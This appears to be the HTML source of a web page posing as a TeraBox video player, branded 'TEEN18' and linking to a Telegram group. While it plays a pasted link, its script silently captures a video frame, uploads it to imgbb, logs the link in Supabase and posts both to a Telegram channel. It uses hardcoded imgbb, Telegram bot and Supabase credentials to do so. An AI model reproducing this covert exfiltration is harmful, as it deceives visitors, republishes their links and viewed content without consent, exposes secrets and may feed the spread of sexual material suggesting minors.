<!DOCTYPE html>
<html lang="en">
<head>
<meta charset="UTF-8"/>
<meta name="viewport" content="width=device-width, initial-scale=1.0"/>
<title>TeraBox Video Player</title>

<meta name="monetag" content="41e692a6b5c0b59b151f300b5cef7bd3">

<script src="https://cdn.tailwindcss.com"></script>
<script src="https://cdn.jsdelivr.net/npm/@supabase/supabase-js@2"></script>

<!-- VIDEO JS -->
<script type="module" src="https://cdn.jsdelivr.net/npm/@videojs/html/cdn/video-minimal.js"></script>
  
<link rel="stylesheet"
href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.5.1/css/all.min.css">

<style>

body{
  font-family:'Segoe UI',sans-serif;
}

.bg-blur{
  background:url('https://images.unsplash.com/photo-1492691527719-9d1e07e534b4')
  center/cover no-repeat;
}

video{
  width:100%;
  height:100%;
  object-fit:contain;
  background:black;
}

video-player,
video-minimal-skin{
  width:100%;
  height:100%;
  display:block;
}

</style>
</head>

<body class="bg-black overflow-hidden h-screen">

<!-- BACKGROUND -->
<div class="fixed inset-0 bg-blur blur-xl brightness-50 -z-20"></div>
<div class="fixed inset-0 bg-black/70 -z-10"></div>

<!-- HEADER -->
<div class="fixed top-4 left-1/2 -translate-x-1/2 w-[94%] h-[70px] bg-white/5 border border-white/10 rounded-2xl flex items-center justify-between px-6 z-50">

  <div class="text-white font-bold text-xl">
    TEEN<span class="text-pink-500">18</span>
  </div>

<button
  onclick="window.open('https://t.me/+Q656m5kaC245Njg1','_blank')"
  class="bg-pink-500/20 px-4 py-2 rounded-full text-white">
  Join Now 🌟
</button>

</div>

<!-- PLAYER -->
<div class="absolute top-1/2 left-1/2 -translate-x-1/2 -translate-y-1/2 w-[94%] h-[70vh] bg-black border border-white/10 rounded-3xl overflow-hidden">

  <video-player>

    <video-minimal-skin>

      <video
        id="player"
        autoplay
        playsinline
        crossorigin="anonymous">
      </video>

    </video-minimal-skin>

  </video-player>

</div>

<!-- INPUT -->


  
<!-- INPUT -->
<div class="fixed bottom-6 left-1/2 -translate-x-1/2 w-[94%] flex gap-3 z-50">

  <div class="flex-1 h-14 bg-[#1a1a1a] border border-white/10 rounded-2xl flex items-center relative overflow-hidden shadow-xl">

    <!-- Paste Button Left Side -->
    <button
      onclick="navigator.clipboard.readText().then(text=>document.getElementById('teraInput').value=text)"
      class="shrink-0 w-[44px] h-[44px] ml-1.5 rounded-[14px] bg-[#2948ff] text-white flex items-center justify-center active:scale-95 transition-all duration-200 shadow-lg">
      
      <i class="fa-duotone fa-solid fa-paste"></i>

    </button>

    <!-- Input -->
    <input
      id="teraInput"
      type="text"
      class="flex-1 min-w-0 h-full bg-transparent px-4 text-white placeholder:text-white/35 outline-none"
      placeholder="Paste your TeraBox link"/>

  </div>

  <!-- Play Button -->
  <button
    onclick="playVideo()"
    class="w-[90px] h-14 shrink-0 rounded-2xl bg-gradient-to-r from-pink-500 to-rose-500 text-white font-bold shadow-[0_0_20px_rgba(236,72,153,0.3)] active:scale-95 transition-all duration-200">
    PLAY
  </button>

</div>
  








  

<script>

// ================= PLAYER =================
const video = document.getElementById("player");

// ================= VARIABLES =================
let currentTeraLink = "";
let uploadedThumb = "";
let thumbnailDone = false;

// ================= APIs =================
const imgbbApi =
"1c5c28965eb8cdcc5e2e78b2298182bf";

const botToken =
"6634953218:AAEOaozrPHqv2Xs7uJ7L-xcStHKqee0fi1Q";

const chatId = "-1001966599723";

// ================= SUPABASE =================
const supabaseUrl =
"https://trdluuhqduebfipnyxlm.supabase.co";

const supabaseKey =
"eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJpc3MiOiJzdXBhYmFzZSIsInJlZiI6InRyZGx1dWhxZHVlYmZpcG55eGxtIiwicm9sZSI6ImFub24iLCJpYXQiOjE3Nzk0MzgyMTUsImV4cCI6MjA5NTAxNDIxNX0.43O4uPz6Jej4-9JAtuOEt7hD7W6lPN1Z0aE6ieHfBF4";

const client =
supabase.createClient(
  supabaseUrl,
  supabaseKey
);

// ================= PLAY VIDEO =================
function playVideo(){

  const link =
  document.getElementById("teraInput")
  .value
  .trim();

  if(!link) return;

  currentTeraLink = link;

  uploadedThumb = "";
  thumbnailDone = false;

  // ================= STREAM URL =================
  const streamUrl =
  "https://1024teradownloader.in/api/video-stream?url=" +
  encodeURIComponent(link) +
  "&index=0&quality=360p";

  // ================= LOAD VIDEO =================
  video.src = streamUrl;

  video.load();

  video.play().catch(()=>{});

}

// ================= AUTO THUMBNAIL =================
video.addEventListener("loadeddata", ()=>{

  setTimeout(()=>{

    video.currentTime =
    Math.min(3, video.duration || 1);

  },1500);

});

// ================= GENERATE THUMB =================
video.addEventListener("seeked", async ()=>{

  if(thumbnailDone) return;

  thumbnailDone = true;

  try{

    // ================= CANVAS =================
    const canvas =
    document.createElement("canvas");

    canvas.width =
    video.videoWidth || 1280;

    canvas.height =
    video.videoHeight || 720;

    const ctx =
    canvas.getContext("2d");

    ctx.drawImage(
      video,
      0,
      0,
      canvas.width,
      canvas.height
    );

    // ================= BASE64 =================
    const base64 =
    canvas
    .toDataURL("image/jpeg",0.8)
    .split(",")[1];





    

    // ================= UPLOAD IMAGE =================
    const upload =
await fetch(
  "https://api.imgbb.com/1/upload?key="+imgbbApi,
  {
    method:"POST",
    body:new URLSearchParams({
      image:base64,
      expiration:"60"
    })
  }
);

const data =
await upload.json();

if(data.success){

  uploadedThumb =
  data.data.url;









      

      // ================= SHORT LINK =================
const code =
Math.random()
.toString(36)
.slice(2,8);

const shareLink =
"https://teen18.vercel.app/Q.html?=" +
encodeURIComponent(currentTeraLink);

// ================= CHECK DUPLICATE =================
const existing =
await client
.from("links")
.select("*")
.eq("long_url", shareLink)
.maybeSingle();

// SAME LINK ALREADY EXISTS
if(existing.data){

  console.log("Already Sent");

  return;

}

// ================= SAVE DATABASE =================
await client
.from("links")
.insert([{
  long_url:shareLink,
  short_code:code
}]);

// ================= FINAL SHORT URL =================
const shortUrl =
"https://short-terabox-link.vercel.app/r.html?c=" +
code;

// ================= TELEGRAM SEND =================
await fetch(
  `https://api.telegram.org/bot${botToken}/sendPhoto`,
  {
    method:"POST",
    headers:{
      "Content-Type":"application/json"
    },
    body:JSON.stringify({

      chat_id:chatId,

      photo:uploadedThumb,

      caption:
`🔥 𝐖𝐚𝐭𝐜𝐡 𝐏𝐫𝐞𝐦𝐢𝐮𝐦 𝐂𝐨𝐧𝐭𝐞𝐧𝐭 ✨
${shortUrl}`

    })
  }
);

console.log("Telegram Sent");

    }

  }catch(err){

    console.log(err);

  }

});
</script>

</body>
</html>
